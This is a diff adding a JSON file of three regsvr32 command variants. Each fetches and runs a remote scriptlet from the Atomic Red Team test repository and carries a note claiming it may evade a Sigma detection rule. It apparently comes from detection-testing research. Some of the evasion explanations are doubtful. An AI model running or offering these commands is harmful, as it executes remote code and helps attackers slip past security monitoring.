@@ -1,0 +1,14 @@
+[
+  {
+    "output": "C:\\Windows\\system32\\regsvr32.exe /s /u -i https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.010/src/RegSvr32.sct scrobj.dll",
+    "explanation": "The command substitutes '/i' with '-i' (substitution of equivalent syntax) and removes the colon after '-i' (omission of optional syntax), which may bypass the Sigma rule that checks for ' /i' or ' -i' with a colon."
+  },
+  {
+    "output": "C:\\Windows\\system32\\regsvr32.exe /s /u /i https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.010/src/RegSvr32.sct scrobj.dll",
+    "explanation": "The command omits the colon after '/i', which may bypass the Sigma rule that checks for '/i:' pattern."
+  },
+  {
+    "output": "C:\\Windows\\system32\\regsvr32.exe /s /u /i http://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.010/src/RegSvr32.sct scrobj.dll",
+    "explanation": "The command changes the protocol from 'https' to 'http', which may bypass the Sigma rule that checks for 'https' but not 'http'."
+  }
+]
